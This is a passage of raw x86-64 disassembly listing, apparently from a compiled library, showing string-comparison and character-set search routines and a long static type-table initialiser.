    69683cef:	7d 12                	jge    0x69683d03
    69683cf1:	42 8a 44 11 10       	mov    0x10(%rcx,%r10,1),%al
    69683cf6:	44 8d 48 bf          	lea    -0x41(%rax),%r9d
    69683cfa:	41 80 f9 19          	cmp    $0x19,%r9b
    69683cfe:	77 03                	ja     0x69683d03
    69683d00:	83 c0 20             	add    $0x20,%eax
    69683d03:	45 31 c9             	xor    %r9d,%r9d
    69683d06:	4d 39 d8             	cmp    %r11,%r8
    69683d09:	7d 13                	jge    0x69683d1e
    69683d0b:	46 8a 4c 02 10       	mov    0x10(%rdx,%r8,1),%r9b
    69683d10:	41 8d 71 bf          	lea    -0x41(%r9),%esi
    69683d14:	40 80 fe 19          	cmp    $0x19,%sil
    69683d18:	77 04                	ja     0x69683d1e
    69683d1a:	41 83 c1 20          	add    $0x20,%r9d
    69683d1e:	0f b6 c0             	movzbl %al,%eax
    69683d21:	45 0f b6 c9          	movzbl %r9b,%r9d
    69683d25:	44 29 c8             	sub    %r9d,%eax
    69683d28:	75 23                	jne    0x69683d4d
    69683d2a:	49 39 da             	cmp    %rbx,%r10
    69683d2d:	7d 0c                	jge    0x69683d3b
    69683d2f:	4d 39 d8             	cmp    %r11,%r8
    69683d32:	7c 14                	jl     0x69683d48
    69683d34:	b8 01 00 00 00       	mov    $0x1,%eax
    69683d39:	eb 14                	jmp    0x69683d4f
    69683d3b:	31 c0                	xor    %eax,%eax
    69683d3d:	4d 39 d8             	cmp    %r11,%r8
    69683d40:	0f 9c c0             	setl   %al
    69683d43:	48 f7 d8             	neg    %rax
    69683d46:	eb 07                	jmp    0x69683d4f
    69683d48:	49 ff c0             	inc    %r8
    69683d4b:	eb 88                	jmp    0x69683cd5
    69683d4d:	48 98                	cltq
    69683d4f:	5b                   	pop    %rbx
    69683d50:	5e                   	pop    %rsi
    69683d51:	c3                   	ret
    69683d52:	55                   	push   %rbp
    69683d53:	57                   	push   %rdi
    69683d54:	56                   	push   %rsi
    69683d55:	53                   	push   %rbx
    69683d56:	48 83 ec 28          	sub    $0x28,%rsp
    69683d5a:	31 db                	xor    %ebx,%ebx
    69683d5c:	49 8d 68 ff          	lea    -0x1(%r8),%rbp
    69683d60:	48 89 ce             	mov    %rcx,%rsi
    69683d63:	48 89 d7             	mov    %rdx,%rdi
    69683d66:	48 39 dd             	cmp    %rbx,%rbp
    69683d69:	7e 17                	jle    0x69683d82
    69683d6b:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
    69683d6f:	48 89 f1             	mov    %rsi,%rcx
    69683d72:	e8 34 ff ff ff       	call   0x69683cab
    69683d77:	48 85 c0             	test   %rax,%rax
    69683d7a:	74 0a                	je     0x69683d86
    69683d7c:	48 83 c3 02          	add    $0x2,%rbx
    69683d80:	eb e4                	jmp    0x69683d66
    69683d82:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
    69683d86:	48 89 d8             	mov    %rbx,%rax
    69683d89:	48 83 c4 28          	add    $0x28,%rsp
    69683d8d:	5b                   	pop    %rbx
    69683d8e:	5e                   	pop    %rsi
    69683d8f:	5f                   	pop    %rdi
    69683d90:	5d                   	pop    %rbp
    69683d91:	c3                   	ret
    69683d92:	4d 85 c9             	test   %r9,%r9
    69683d95:	75 0f                	jne    0x69683da6
    69683d97:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
    69683d9b:	48 85 c9             	test   %rcx,%rcx
    69683d9e:	74 06                	je     0x69683da6
    69683da0:	48 8b 01             	mov    (%rcx),%rax
    69683da3:	49 01 c1             	add    %rax,%r9
    69683da6:	4c 89 c0             	mov    %r8,%rax
    69683da9:	49 39 c1             	cmp    %rax,%r9
    69683dac:	7c 24                	jl     0x69683dd2
    69683dae:	44 8a 44 01 10       	mov    0x10(%rcx,%rax,1),%r8b
    69683db3:	45 89 c2             	mov    %r8d,%r10d
    69683db6:	41 83 e0 07          	and    $0x7,%r8d
    69683dba:	41 c0 ea 03          	shr    $0x3,%r10b
    69683dbe:	45 0f b6 d2          	movzbl %r10b,%r10d
    69683dc2:	46 0f b6 14 12       	movzbl (%rdx,%r10,1),%r10d
    69683dc7:	45 0f a3 c2          	bt     %r8d,%r10d
    69683dcb:	72 09                	jb     0x69683dd6
    69683dcd:	48 ff c0             	inc    %rax
    69683dd0:	eb d7                	jmp    0x69683da9
    69683dd2:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
    69683dd6:	c3                   	ret
    69683dd7:	48 83 ec 28          	sub    $0x28,%rsp
    69683ddb:	45 31 c9             	xor    %r9d,%r9d
    69683dde:	45 31 c0             	xor    %r8d,%r8d
    69683de1:	e8 ac ff ff ff       	call   0x69683d92
    69683de6:	48 f7 d0             	not    %rax
    69683de9:	48 c1 e8 3f          	shr    $0x3f,%rax
    69683ded:	48 83 c4 28          	add    $0x28,%rsp
    69683df1:	c3                   	ret
    69683df2:	48 8d 05 a7 52 0f 00 	lea    0xf52a7(%rip),%rax        # 0x697790a0
    69683df9:	c6 05 a0 52 0f 00 02 	movb   $0x2,0xf52a0(%rip)        # 0x697790a0
    69683e00:	48 89 05 b9 db 0f 00 	mov    %rax,0xfdbb9(%rip)        # 0x697819c0
    69683e07:	48 8d 05 92 db 0f 00 	lea    0xfdb92(%rip),%rax        # 0x697819a0
    69683e0e:	48 89 05 e3 88 10 00 	mov    %rax,0x1088e3(%rip)        # 0x6978c6f8
    69683e15:	48 8d 05 e4 52 0f 00 	lea    0xf52e4(%rip),%rax        # 0x69779100
    69683e1c:	48 89 05 3d 52 0f 00 	mov    %rax,0xf523d(%rip)        # 0x69779060
    69683e23:	48 8d 05 8d a3 00 00 	lea    0xa38d(%rip),%rax        # 0x6968e1b7
    69683e2a:	48 89 05 e7 52 0f 00 	mov    %rax,0xf52e7(%rip)        # 0x69779118
    69683e31:	48 8d 05 f8 52 0f 00 	lea    0xf52f8(%rip),%rax        # 0x69779130
    69683e38:	48 8d 0d c1 09 10 00 	lea    0x1009c1(%rip),%rcx        # 0x69784800
    69683e3f:	48 89 05 22 52 0f 00 	mov    %rax,0xf5222(%rip)        # 0x69779068
    69683e46:	4c 8d 0d 13 53 0f 00 	lea    0xf5313(%rip),%r9        # 0x69779160
    69683e4d:	48 89 0d bc 52 0f 00 	mov    %rcx,0xf52bc(%rip)        # 0x69779110
    69683e54:	48 8d 05 e5 6c 0f 00 	lea    0xf6ce5(%rip),%rax        # 0x6977ab40
    69683e5b:	4c 89 0d 0e 52 0f 00 	mov    %r9,0xf520e(%rip)        # 0x69779070
    69683e62:	4c 8d 05 3f a3 00 00 	lea    0xa33f(%rip),%r8        # 0x6968e1a8
    69683e69:	48 89 05 d0 52 0f 00 	mov    %rax,0xf52d0(%rip)        # 0x69779140
    69683e70:	4c 8d 15 09 86 10 00 	lea    0x108609(%rip),%r10        # 0x6978c480
    69683e77:	4c 89 05 ca 52 0f 00 	mov    %r8,0xf52ca(%rip)        # 0x69779148
    69683e7e:	4c 8d 1d 39 a3 00 00 	lea    0xa339(%rip),%r11        # 0x6968e1be
    69683e85:	48 c7 05 28 db 0f 00 	movq   $0x0,0xfdb28(%rip)        # 0x697819b8
    69683e8c:	00 00 00 00 
    69683e90:	4d 8d 41 30          	lea    0x30(%r9),%r8
    69683e94:	c6 05 55 88 10 00 11 	movb   $0x11,0x108855(%rip)        # 0x6978c6f0
    69683e9b:	49 81 c1 90 00 00 00 	add    $0x90,%r9
    69683ea2:	66 c7 05 05 db 0f 00 	movw   $0x111,0xfdb05(%rip)        # 0x697819b0
    69683ea9:	11 01 
    69683eab:	48 8d 15 2e 88 10 00 	lea    0x10882e(%rip),%rdx        # 0x6978c6e0
    69683eb2:	48 c7 05 e3 da 0f 00 	movq   $0x8,0xfdae3(%rip)        # 0x697819a0
    69683eb9:	08 00 00 00 
    69683ebd:	48 c7 05 e0 da 0f 00 	movq   $0x8,0xfdae0(%rip)        # 0x697819a8
    69683ec4:	08 00 00 00 
    69683ec8:	48 c7 05 ed 51 0f 00 	movq   $0x0,0xf51ed(%rip)        # 0x697790c0
    69683ecf:	00 00 00 00 
    69683ed3:	48 c7 05 02 88 10 00 	movq   $0x30,0x108802(%rip)        # 0x6978c6e0
    69683eda:	30 00 00 00 
    69683ede:	48 c7 05 ff 87 10 00 	movq   $0x8,0x1087ff(%rip)        # 0x6978c6e8
    69683ee5:	08 00 00 00 
    69683ee9:	c6 05 10 52 0f 00 01 	movb   $0x1,0xf5210(%rip)        # 0x69779100
    69683ef0:	48 c7 05 0d 52 0f 00 	movq   $0x8,0xf520d(%rip)        # 0x69779108
    69683ef7:	08 00 00 00 
    69683efb:	48 c7 05 52 6c 0f 00 	movq   $0x0,0xf6c52(%rip)        # 0x6977ab58
    69683f02:	00 00 00 00 
    69683f06:	48 c7 05 2f 6c 0f 00 	movq   $0x8,0xf6c2f(%rip)        # 0x6977ab40
    69683f0d:	08 00 00 00 
    69683f11:	48 c7 05 2c 6c 0f 00 	movq   $0x8,0xf6c2c(%rip)        # 0x6977ab48
    69683f18:	08 00 00 00 
    69683f1c:	66 c7 05 2b 6c 0f 00 	movw   $0x31d,0xf6c2b(%rip)        # 0x6977ab50
    69683f23:	1d 03 
    69683f25:	c6 05 04 52 0f 00 01 	movb   $0x1,0xf5204(%rip)        # 0x69779130
    69683f2c:	48 c7 05 01 52 0f 00 	movq   $0x10,0xf5201(%rip)        # 0x69779138
    69683f33:	10 00 00 00 
    69683f37:	48 c7 05 56 85 10 00 	movq   $0x0,0x108556(%rip)        # 0x6978c498
    69683f3e:	00 00 00 00 
    69683f42:	48 c7 05 33 85 10 00 	movq   $0x8,0x108533(%rip)        # 0x6978c480
    69683f49:	08 00 00 00 
    69683f4d:	48 c7 05 30 85 10 00 	movq   $0x8,0x108530(%rip)        # 0x6978c488
    69683f54:	08 00 00 00 
    69683f58:	66 c7 05 2f 85 10 00 	movw   $0x21c,0x10852f(%rip)        # 0x6978c490
    69683f5f:	1c 02 
    69683f61:	c6 05 f8 51 0f 00 01 	movb   $0x1,0xf51f8(%rip)        # 0x69779160
    69683f68:	48 c7 05 f5 51 0f 00 	movq   $0x18,0xf51f5(%rip)        # 0x69779168
    69683f6f:	18 00 00 00 
    69683f73:	4c 89 15 f6 51 0f 00 	mov    %r10,0xf51f6(%rip)        # 0x69779170
    69683f7a:	4c 8d 15 41 a2 00 00 	lea    0xa241(%rip),%r10        # 0x6968e1c2
    69683f81:	48 89 05 78 52 0f 00 	mov    %rax,0xf5278(%rip)        # 0x69779200
    69683f88:	48 89 05 d1 52 0f 00 	mov    %rax,0xf52d1(%rip)        # 0x69779260
    69683f8f:	48 8d 05 3a a2 00 00 	lea    0xa23a(%rip),%rax        # 0x6968e1d0
    69683f96:	4c 89 1d db 51 0f 00 	mov    %r11,0xf51db(%rip)        # 0x69779178
    69683f9d:	4d 8d 98 90 00 00 00 	lea    0x90(%r8),%r11
    69683fa4:	48 89 05 bd 52 0f 00 	mov    %rax,0xf52bd(%rip)        # 0x69779268
    69683fab:	48 8d 05 7e 50 0f 00 	lea    0xf507e(%rip),%rax        # 0x69779030
    69683fb2:	48 89 05 2f 52 0f 00 	mov    %rax,0xf522f(%rip)        # 0x697791e8
    69683fb9:	49 8d 43 a0          	lea    -0x60(%r11),%rax
    69683fbd:	4c 89 05 b4 50 0f 00 	mov    %r8,0xf50b4(%rip)        # 0x69779078
    69683fc4:	4c 8d 05 55 6a 0f 00 	lea    0xf6a55(%rip),%r8        # 0x6977aa20
    69683fcb:	4c 89 0d 5e 50 0f 00 	mov    %r9,0xf505e(%rip)        # 0x69779030
    69683fd2:	4c 8d 0d f2 a1 00 00 	lea    0xa1f2(%rip),%r9        # 0x6968e1cb
    69683fd9:	4c 89 15 28 52 0f 00 	mov    %r10,0xf5228(%rip)        # 0x69779208
    69683fe0:	4d 8d 53 30          	lea    0x30(%r11),%r10
    69683fe4:	48 89 05 75 0b 10 00 	mov    %rax,0x100b75(%rip)        # 0x69784b60
    69683feb:	48 8d 05 4e 0b 10 00 	lea    0x100b4e(%rip),%rax        # 0x69784b40
    69683ff2:	4c 89 1d 3f 50 0f 00 	mov    %r11,0xf503f(%rip)        # 0x69779038
    69683ff9:	4c 89 05 30 52 0f 00 	mov    %r8,0xf5230(%rip)        # 0x69779230
    69684000:	4c 89 0d 31 52 0f 00 	mov    %r9,0xf5231(%rip)        # 0x69779238
    69684007:	4c 89 15 32 50 0f 00 	mov    %r10,0xf5032(%rip)        # 0x69779040
    6968400e:	48 c7 05 3f 0b 10 00 	movq   $0x0,0x100b3f(%rip)        # 0x69784b58
    69684015:	00 00 00 00 
    69684019:	48 c7 05 1c 0b 10 00 	movq   $0x18,0x100b1c(%rip)        # 0x69784b40
    69684020:	18 00 00 00 
    69684024:	48 c7 05 19 0b 10 00 	movq   $0x8,0x100b19(%rip)        # 0x69784b48
    6968402b:	08 00 00 00 
    6968402f:	66 c7 05 18 0b 10 00 	movw   $0x112,0x100b18(%rip)        # 0x69784b50
    69684036:	12 01 
    69684038:	c6 05 b1 51 0f 00 01 	movb   $0x1,0xf51b1(%rip)        # 0x697791f0
    6968403f:	48 c7 05 ae 51 0f 00 	movq   $0x0,0xf51ae(%rip)        # 0x697791f8
    69684046:	00 00 00 00 
    6968404a:	48 c7 05 e3 69 0f 00 	movq   $0x0,0xf69e3(%rip)        # 0x6977aa38
    69684051:	00 00 00 00 
    69684055:	48 c7 05 c0 69 0f 00 	movq   $0x8,0xf69c0(%rip)        # 0x6977aa20
    6968405c:	08 00 00 00 
    69684060:	48 c7 05 bd 69 0f 00 	movq   $0x8,0xf69bd(%rip)        # 0x6977aa28
    69684067:	08 00 00 00 
    6968406b:	66 c7 05 bc 69 0f 00 	movw   $0x31f,0xf69bc(%rip)        # 0x6977aa30
    69684072:	1f 03 
    69684074:	c6 05 a5 51 0f 00 01 	movb   $0x1,0xf51a5(%rip)        # 0x69779220
    6968407b:	48 c7 05 a2 51 0f 00 	movq   $0x8,0xf51a2(%rip)        # 0x69779228
    69684082:	08 00 00 00 
    69684086:	c6 05 c3 51 0f 00 01 	movb   $0x1,0xf51c3(%rip)        # 0x69779250
    6968408d:	48 c7 05 c0 51 0f 00 	movq   $0x10,0xf51c0(%rip)        # 0x69779258
    69684094:	10 00 00 00 
    69684098:	48 c7 05 3d 51 0f 00 	movq   $0x3,0xf513d(%rip)        # 0x697791e0
    6968409f:	03 00 00 00 
    696840a3:	c6 05 16 51 0f 00 02 	movb   $0x2,0xf5116(%rip)        # 0x697791c0
    696840aa:	48 c7 05 cb 09 10 00 	movq   $0x8,0x1009cb(%rip)        # 0x69784a80
    696840b1:	08 00 00 00 
    696840b5:	48 c7 05 c8 09 10 00 	movq   $0x8,0x1009c8(%rip)        # 0x69784a88
    696840bc:	08 00 00 00 
    696840c0:	c6 05 c9 09 10 00 18 	movb   $0x18,0x1009c9(%rip)        # 0x69784a90
    696840c7:	48 89 05 ca 09 10 00 	mov    %rax,0x1009ca(%rip)        # 0x69784a98
    696840ce:	48 8d 05 64 d8 ff ff 	lea    -0x279c(%rip),%rax        # 0x69681939
    696840d5:	48 89 05 d4 09 10 00 	mov    %rax,0x1009d4(%rip)        # 0x69784ab0
    696840dc:	48 8d 05 9d 09 10 00 	lea    0x10099d(%rip),%rax        # 0x69784a80
    696840e3:	48 89 05 b6 50 0f 00 	mov    %rax,0xf50b6(%rip)        # 0x697791a0
    696840ea:	48 8d 05 e8 a0 00 00 	lea    0xa0e8(%rip),%rax        # 0x6968e1d9
    696840f1:	48 89 05 b0 50 0f 00 	mov    %rax,0xf50b0(%rip)        # 0x697791a8
    696840f8:	49 8d 43 60          	lea    0x60(%r11),%rax
    696840fc:	48 89 05 7d 4f 0f 00 	mov    %rax,0xf4f7d(%rip)        # 0x69779080
    69684103:	48 8d 05 d5 a0 00 00 	lea    0xa0d5(%rip),%rax        # 0x6968e1df
    6968410a:	48 89 05 87 51 0f 00 	mov    %rax,0xf5187(%rip)        # 0x69779298
    69684111:	48 8d 05 48 4f 0f 00 	lea    0xf4f48(%rip),%rax        # 0x69779060
    69684118:	48 89 05 d9 4f 0f 00 	mov    %rax,0xf4fd9(%rip)        # 0x697790f8
    6968411f:	49 8d 83 b0 fe ff ff 	lea    -0x150(%r11),%rax
    69684126:	48 89 0d 63 51 0f 00 	mov    %rcx,0xf5163(%rip)        # 0x69779290
    6968412d:	49 8d 8b 90 00 00 00 	lea    0x90(%r11),%rcx
    69684134:	48 89 05 c5 85 10 00 	mov    %rax,0x1085c5(%rip)        # 0x6978c700
    6968413b:	48 8d 05 b1 29 00 00 	lea    0x29b1(%rip),%rax        # 0x69686af3
    69684142:	48 89 05 e7 06 10 00 	mov    %rax,0x1006e7(%rip)        # 0x69784830
    69684149:	48 8d 05 30 85 10 00 	lea    0x108530(%rip),%rax        # 0x6978c680
    69684150:	48 89 0d 49 85 10 00 	mov    %rcx,0x108549(%rip)        # 0x6978c6a0
    69684157:	49 8d 8b c0 00 00 00 	lea    0xc0(%r11),%rcx
    6968415e:	48 89 15 b3 06 10 00 	mov    %rdx,0x1006b3(%rip)        # 0x69784818
    69684165:	48 89 15 2c 85 10 00 	mov    %rdx,0x10852c(%rip)        # 0x6978c698
    6968416c:	48 89 05 45 14 10 00 	mov    %rax,0x101445(%rip)        # 0x697855b8
    69684173:	c6 05 16 50 0f 00 01 	movb   $0x1,0xf5016(%rip)        # 0x69779190
    6968417a:	48 c7 05 13 50 0f 00 	movq   $0x20,0xf5013(%rip)        # 0x69779198
    69684181:	20 00 00 00 
    69684185:	c6 05 f4 50 0f 00 01 	movb   $0x1,0xf50f4(%rip)        # 0x69779280
    6968418c:	48 c7 05 f1 50 0f 00 	movq   $0x28,0xf50f1(%rip)        # 0x69779288
    69684193:	28 00 00 00 
    69684197:	48 c7 05 4e 4f 0f 00 	movq   $0x5,0xf4f4e(%rip)        # 0x697790f0
    6968419e:	05 00 00 00 
    696841a2:	c6 05 27 4f 0f 00 02 	movb   $0x2,0xf4f27(%rip)        # 0x697790d0
    696841a9:	48 c7 05 4c 06 10 00 	movq   $0x8,0x10064c(%rip)        # 0x69784800
    696841b0:	08 00 00 00 
    696841b4:	48 c7 05 49 06 10 00 	movq   $0x8,0x100649(%rip)        # 0x69784808
    696841bb:	08 00 00 00 
    696841bf:	c6 05 4a 06 10 00 16 	movb   $0x16,0x10064a(%rip)        # 0x69784810
    696841c6:	48 c7 05 af 84 10 00 	movq   $0x30,0x1084af(%rip)        # 0x6978c680
    696841cd:	30 00 00 00 
    696841d1:	48 c7 05 ac 84 10 00 	movq   $0x8,0x1084ac(%rip)        # 0x6978c688
    696841d8:	08 00 00 00 
    696841dc:	c6 05 ad 84 10 00 11 	movb   $0x11,0x1084ad(%rip)        # 0x6978c690
    696841e3:	48 c7 05 e2 50 0f 00 	movq   $0x0,0xf50e2(%rip)        # 0x697792d0
    696841ea:	00 00 00 00 
    696841ee:	c6 05 bb 50 0f 00 02 	movb   $0x2,0xf50bb(%rip)        # 0x697792b0
    696841f5:	48 c7 05 a0 13 10 00 	movq   $0x30,0x1013a0(%rip)        # 0x697855a0
    696841fc:	30 00 00 00 
    69684200:	48 c7 05 9d 13 10 00 	movq   $0x8,0x10139d(%rip)        # 0x697855a8
    69684207:	08 00 00 00 
    6968420b:	c6 05 9e 13 10 00 11 	movb   $0x11,0x10139e(%rip)        # 0x697855b0
    69684212:	48 c7 05 e3 50 0f 00 	movq   $0x0,0xf50e3(%rip)        # 0x69779300
    69684219:	00 00 00 00 
    6968421d:	c6 05 bc 50 0f 00 02 	movb   $0x2,0xf50bc(%rip)        # 0x697792e0
    69684224:	48 89 0d 95 13 10 00 	mov    %rcx,0x101395(%rip)        # 0x697855c0
    6968422b:	48 8d 0d 6e 13 10 00 	lea    0x10136e(%rip),%rcx        # 0x697855a0
    69684232:	48 89 05 3f 04 10 00 	mov    %rax,0x10043f(%rip)        # 0x69784678
    69684239:	49 8d 83 f0 00 00 00 	lea    0xf0(%r11),%rax
    69684240:	48 89 05 39 04 10 00 	mov    %rax,0x100439(%rip)        # 0x69784680
    69684247:	48 8d 05 12 04 10 00 	lea    0x100412(%rip),%rax        # 0x69784660
    6968424e:	48 89 05 e3 07 10 00 	mov    %rax,0x1007e3(%rip)        # 0x69784a38
    69684255:	49 8d 83 20 01 00 00 	lea    0x120(%r11),%rax
    6968425c:	48 89 05 dd 07 10 00 	mov    %rax,0x1007dd(%rip)        # 0x69784a40
    69684263:	48 8d 05 b6 07 10 00 	lea    0x1007b6(%rip),%rax        # 0x69784a20
    6968426a:	48 89 0d 87 0f 10 00 	mov    %rcx,0x100f87(%rip)        # 0x697851f8
    69684271:	48 8d 0d 73 29 00 00 	lea    0x2973(%rip),%rcx        # 0x69686beb
    69684278:	48 89 05 f9 04 10 00 	mov    %rax,0x1004f9(%rip)        # 0x69784778
    6968427f:	48 8d 05 ab 28 00 00 	lea    0x28ab(%rip),%rax        # 0x69686b31
    69684286:	48 89 15 ab 0f 10 00 	mov    %rdx,0x100fab(%rip)        # 0x69785238
    6968428d:	49 8d 93 50 01 00 00 	lea    0x150(%r11),%rdx
    69684294:	48 89 0d 75 0f 10 00 	mov    %rcx,0x100f75(%rip)        # 0x69785210
    6968429b:	48 8d 0d 1e 82 10 00 	lea    0x10821e(%rip),%rcx        # 0x6978c4c0
    696842a2:	48 89 05 e7 04 10 00 	mov    %rax,0x1004e7(%rip)        # 0x69784790
    696842a9:	48 8d 05 70 0f 10 00 	lea    0x100f70(%rip),%rax        # 0x69785220
    696842b0:	48 c7 05 25 0f 10 00 	movq   $0x8,0x100f25(%rip)        # 0x697851e0
    696842b7:	08 00 00 00 
    696842bb:	48 c7 05 22 0f 10 00 	movq   $0x8,0x100f22(%rip)        # 0x697851e8
    696842c2:	08 00 00 00 
    696842c6:	c6 05 23 0f 10 00 16 	movb   $0x16,0x100f23(%rip)        # 0x697851f0
    696842cd:	48 c7 05 88 03 10 00 	movq   $0x30,0x100388(%rip)        # 0x69784660
    696842d4:	30 00 00 00 
    696842d8:	48 c7 05 85 03 10 00 	movq   $0x8,0x100385(%rip)        # 0x69784668
    696842df:	08 00 00 00 
    696842e3:	c6 05 86 03 10 00 11 	movb   $0x11,0x100386(%rip)        # 0x69784670
    696842ea:	48 c7 05 3b 50 0f 00 	movq   $0x0,0xf503b(%rip)        # 0x69779330
    696842f1:	00 00 00 00 
    696842f5:	c6 05 14 50 0f 00 02 	movb   $0x2,0xf5014(%rip)        # 0x69779310
    696842fc:	48 c7 05 19 07 10 00 	movq   $0x30,0x100719(%rip)        # 0x69784a20
    69684303:	30 00 00 00 
    69684307:	48 c7 05 16 07 10 00 	movq   $0x8,0x100716(%rip)        # 0x69784a28
    6968430e:	08 00 00 00 
    69684312:	c6 05 17 07 10 00 11 	movb   $0x11,0x100717(%rip)        # 0x69784a30
    69684319:	48 c7 05 3c 50 0f 00 	movq   $0x0,0xf503c(%rip)        # 0x69779360
    69684320:	00 00 00 00 
    69684324:	c6 05 15 50 0f 00 02 	movb   $0x2,0xf5015(%rip)        # 0x69779340
    6968432b:	48 c7 05 2a 04 10 00 	movq   $0x8,0x10042a(%rip)        # 0x69784760
    69684332:	08 00 00 00 
    69684336:	48 c7 05 27 04 10 00 	movq   $0x8,0x100427(%rip)        # 0x69784768
    6968433d:	08 00 00 00 
    69684341:	c6 05 28 04 10 00 16 	movb   $0x16,0x100428(%rip)        # 0x69784770
    69684348:	48 c7 05 e5 82 10 00 	movq   $0x0,0x1082e5(%rip)        # 0x6978c638
    6968434f:	00 00 00 00 
    69684353:	48 c7 05 c2 82 10 00 	movq   $0x4,0x1082c2(%rip)        # 0x6978c620
    6968435a:	04 00 00 00 
    6968435e:	48 c7 05 bf 82 10 00 	movq   $0x4,0x1082bf(%rip)        # 0x6978c628
    69684365:	04 00 00 00 
    69684369:	66 c7 05 be 82 10 00 	movw   $0x32b,0x1082be(%rip)        # 0x6978c630
    69684370:	2b 03 
    69684372:	48 c7 05 a3 0e 10 00 	movq   $0x30,0x100ea3(%rip)        # 0x69785220
    69684379:	30 00 00 00 
    6968437d:	48 c7 05 a0 0e 10 00 	movq   $0x8,0x100ea0(%rip)        # 0x69785228
    69684384:	08 00 00 00 
    69684388:	c6 05 a1 0e 10 00 11 	movb   $0x11,0x100ea1(%rip)        # 0x69785230
    6968438f:	48 c7 05 f6 4f 0f 00 	movq   $0x0,0xf4ff6(%rip)        # 0x69779390
    69684396:	00 00 00 00 
    6968439a:	48 89 15 9f 0e 10 00 	mov    %rdx,0x100e9f(%rip)        # 0x69785240
    696843a1:	49 8d 93 80 01 00 00 	lea    0x180(%r11),%rdx
    696843a8:	48 89 15 11 84 10 00 	mov    %rdx,0x108411(%rip)        # 0x6978c7c0
    696843af:	48 8d 15 ea 83 10 00 	lea    0x1083ea(%rip),%rdx        # 0x6978c7a0
    696843b6:	48 89 15 7b 08 10 00 	mov    %rdx,0x10087b(%rip)        # 0x69784c38
    696843bd:	48 8d 15 29 28 00 00 	lea    0x2829(%rip),%rdx        # 0x69686bed
    696843c4:	48 89 05 ed 83 10 00 	mov    %rax,0x1083ed(%rip)        # 0x6978c7b8
    696843cb:	48 89 15 7e 08 10 00 	mov    %rdx,0x10087e(%rip)        # 0x69784c50
    696843d2:	48 8d 15 09 9e 00 00 	lea    0x9e09(%rip),%rdx        # 0x6968e1e2
    696843d9:	c6 05 90 4f 0f 00 02 	movb   $0x2,0xf4f90(%rip)        # 0x69779370
    696843e0:	48 c7 05 b5 83 10 00 	movq   $0x30,0x1083b5(%rip)        # 0x6978c7a0
    696843e7:	30 00 00 00 
    696843eb:	48 c7 05 b2 83 10 00 	movq   $0x8,0x1083b2(%rip)        # 0x6978c7a8
    696843f2:	08 00 00 00 
    696843f6:	c6 05 b3 83 10 00 11 	movb   $0x11,0x1083b3(%rip)        # 0x6978c7b0
    696843fd:	48 c7 05 b8 4f 0f 00 	movq   $0x0,0xf4fb8(%rip)        # 0x697793c0
    69684404:	00 00 00 00 
    69684408:	c6 05 91 4f 0f 00 02 	movb   $0x2,0xf4f91(%rip)        # 0x697793a0
    6968440f:	48 c7 05 06 08 10 00 	movq   $0x8,0x100806(%rip)        # 0x69784c20
    69684416:	08 00 00 00 
    6968441a:	48 c7 05 03 08 10 00 	movq   $0x8,0x100803(%rip)        # 0x69784c28
    69684421:	08 00 00 00 
    69684425:	c6 05 04 08 10 00 16 	movb   $0x16,0x100804(%rip)        # 0x69784c30
    6968442c:	48 c7 05 a1 80 10 00 	movq   $0x0,0x1080a1(%rip)        # 0x6978c4d8
    69684433:	00 00 00 00 
    69684437:	48 c7 05 7e 80 10 00 	movq   $0x4,0x10807e(%rip)        # 0x6978c4c0
    6968443e:	04 00 00 00 
    69684442:	48 c7 05 7b 80 10 00 	movq   $0x4,0x10807b(%rip)        # 0x6978c4c8
    69684449:	04 00 00 00 
    6968444d:	66 c7 05 7a 80 10 00 	movw   $0x322,0x10807a(%rip)        # 0x6978c4d0
    69684454:	22 03 
    69684456:	48 c7 05 17 d5 0f 00 	movq   $0x0,0xfd517(%rip)        # 0x69781978
    6968445d:	00 00 00 00 
    69684461:	48 c7 05 f4 d4 0f 00 	movq   $0x1,0xfd4f4(%rip)        # 0x69781960
    69684468:	01 00 00 00 
    6968446c:	48 c7 05 f1 d4 0f 00 	movq   $0x1,0xfd4f1(%rip)        # 0x69781968
    69684473:	01 00 00 00 
    69684477:	66 c7 05 f0 d4 0f 00 	movw   $0x329,0xfd4f0(%rip)        # 0x69781970
    6968447e:	29 03 
    69684480:	48 c7 05 ed 0d 10 00 	movq   $0x0,0x100ded(%rip)        # 0x69785278
    69684487:	00 00 00 00 
    6968448b:	48 c7 05 ca 0d 10 00 	movq   $0x4,0x100dca(%rip)        # 0x69785260
    69684492:	04 00 00 00 
    69684496:	48 c7 05 c7 0d 10 00 	movq   $0x4,0x100dc7(%rip)        # 0x69785268
    6968449d:	04 00 00 00 
    696844a1:	66 c7 05 c6 0d 10 00 	movw   $0x322,0x100dc6(%rip)        # 0x69785270
    696844a8:	22 03 
    696844aa:	48 c7 05 e3 80 10 00 	movq   $0x0,0x1080e3(%rip)        # 0x6978c598
    696844b1:	00 00 00 00 
    696844b5:	48 c7 05 c0 80 10 00 	movq   $0x1,0x1080c0(%rip)        # 0x6978c580
    696844bc:	01 00 00 00 
    696844c0:	48 c7 05 bd 80 10 00 	movq   $0x1,0x1080bd(%rip)        # 0x6978c588
    696844c7:	01 00 00 00 
    696844cb:	66 c7 05 bc 80 10 00 	movw   $0x301,0x1080bc(%rip)        # 0x6978c590
    696844d2:	01 03 
    696844d4:	48 c7 05 81 0f 10 00 	movq   $0x38,0x100f81(%rip)        # 0x69785460
    696844db:	38 00 00 00 
    696844df:	48 c7 05 7e 0f 10 00 	movq   $0x8,0x100f7e(%rip)        # 0x69785468
    696844e6:	08 00 00 00 
    696844ea:	c6 05 7f 0f 10 00 11 	movb   $0x11,0x100f7f(%rip)        # 0x69785470
    696844f1:	48 89 05 80 0f 10 00 	mov    %rax,0x100f80(%rip)        # 0x69785478
    696844f8:	48 89 05 d9 0f 10 00 	mov    %rax,0x100fd9(%rip)        # 0x697854d8
    696844ff:	49 8d 83 e0 01 00 00 	lea    0x1e0(%r11),%rax
    69684506:	48 89 0d d3 4e 0f 00 	mov    %rcx,0xf4ed3(%rip)        # 0x697793e0
    6968450d:	49 8d 8b b0 01 00 00 	lea    0x1b0(%r11),%rcx
    69684514:	48 89 05 c5 0f 10 00 	mov    %rax,0x100fc5(%rip)        # 0x697854e0
    6968451b:	48 8d 05 9e 0f 10 00 	lea    0x100f9e(%rip),%rax        # 0x697854c0
    69684522:	48 89 15 bf 4e 0f 00 	mov    %rdx,0xf4ebf(%rip)        # 0x697793e8
